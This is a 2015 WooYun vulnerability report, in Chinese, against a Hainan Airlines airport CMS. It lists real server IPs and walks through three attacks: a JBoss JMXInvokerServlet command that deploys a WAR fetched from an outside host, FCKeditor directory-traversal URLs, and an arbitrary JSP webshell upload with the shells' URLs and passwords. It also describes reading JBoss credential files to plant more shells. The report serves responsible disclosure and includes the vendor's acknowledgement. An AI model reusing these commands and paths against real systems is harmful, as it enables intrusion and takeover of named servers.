{"id": 49060, "wybug_id": "wooyun-2015-0117493", "wybug_title": "海南航空某定制管理平台通用型漏洞打包（getshell）", "wybug_corp": "海南航空", "wybug_author": "茜茜公主", "wybug_date": "2015-06-01 15:06", "wybug_open_date": "2015-08-31 09:16", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-05：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-31：\t细节向公众公开  简要描述： 1#配置不当导致命令执行（个别站），主要是下面这2个2#目录遍历，3#任意文件上传。 详细说明：  这套CMS都长这个样\n\n在页面顶部明显位置均有标注海航机场网站内容管理平台\n\n关键字：“autoweb 机场”这套CMS由2个部分组成，一部分是autoweb前台，一部分是autoportal后台，所以搜的时候搜前台合适\n\n前台长这样\n\n这些案例均属于海南航空集团旗下把我找到的一些案例列出来\nhttp://111.207.210.120/autoportal/LoginForm.jsphttp://202.100.200.203/autoportal/LoginForm.jsp（提示无权限访问，但没关系，漏洞仍然可以利用）http://202.100.200.73/autoportal/LoginForm.jsphttp://113.59.108.89/autoportal/LoginForm.jsphttp://221.11.139.164/autoportal/LoginForm.jsp（提示无权限访问，但没关系，漏洞仍然可以利用）等等\n以http://111.207.210.120/autoportal/LoginForm.jsp该站为例\n\n该系统中间件jboss存在漏洞（貌似只有这个站有invoker/JMXInvokerServlet），其它站都是jmx-console，但无法绕过认证上传shellhttp://111.207.210.120/invoker/JMXInvokerServlet，可通过下面代码进行getshell\njava -jar jboss_exploit_fat.jar -i http://111.207.210.120/invoker/JMXInvokerServlet invoke jboss.system:service=MainDeployer deploy http://p2j.cn/is.war\n\n\n一句话地址：http://111.207.210.120/is/index.jsp密码：023\n\n\n\n该服务器3389已开，已被黑客拿下用作挖坑，挂qq\n\n   漏洞证明：  接下来是漏洞2：fck目录遍历以及fck上传\nhttp://111.207.210.120/autoportal//nebula/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../../../../../autoportal.ear/autoweb.war/autoweb/\n\n\n可跨目录\n\n服务器内容比较多，基本看不懂,很多的vm虚拟机\n\nfck拿shell\nhttp://111.207.210.120/autoportal/nebula/FCKeditor/editor/filemanager/browser/default/browser.html?Connector=http://111.207.210.120/autoportal//nebula/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector\n可直接上传jsp文件\n\n但访问jsp会跳转到系统登录页后台的设计还是比较合理的，没有漏洞可钻，所以我把jsp一句话跨目录传到了前台autoweb，利用fck的目录遍历功能，找到autoweb的路径，上传之POC见测试代码\n\n一句话http://111.207.210.120/autoweb/wooyun.jsp密码：wooyun\n\n\n\n其它几个案例的fck问题：\nhttp://202.100.200.203//autoportal//nebula/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../../../../\n\n\n这个站已成马场，上传的话直接用poc比较快\n\nhttp://202.100.200.203/qutoweb/wooyun.jsp\n\n下面几个案例的fck上传我就不演示了\nhttp://202.100.200.73//autoportal//nebula/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../../../../\n\n\n\nhttp://113.59.108.89//autoportal//nebula/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../../../../\n\n\n\nhttp://221.11.139.164//autoportal//nebula/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../../../../\n\n\n因为该套系统用的都是jboss，所以我拿到shell后，可以去读jmx-console-users.properties获取jboss认证，之后仍可通过http://113.59.108.89/jmx-console/http://111.207.210.120/jmx-console/http://202.100.200.203/jmx-console/http://202.100.200.73/jmx-console/http://221.11.139.164/jmx-console/部署war，getshell   修复方案：  在修复编辑器漏洞的同时，记得修改认证密码，最好直接删除jmx-console   版权声明：转载请注明来源 茜茜公主@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-06-02 09:15 厂商回复： 谢谢，我们立即安排组织漏洞修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-31 10:06 |    \t\tBear baby \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:20        | 善攻者，不知其所守。善守者，不知其所攻。)\t\t \n  66666666    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}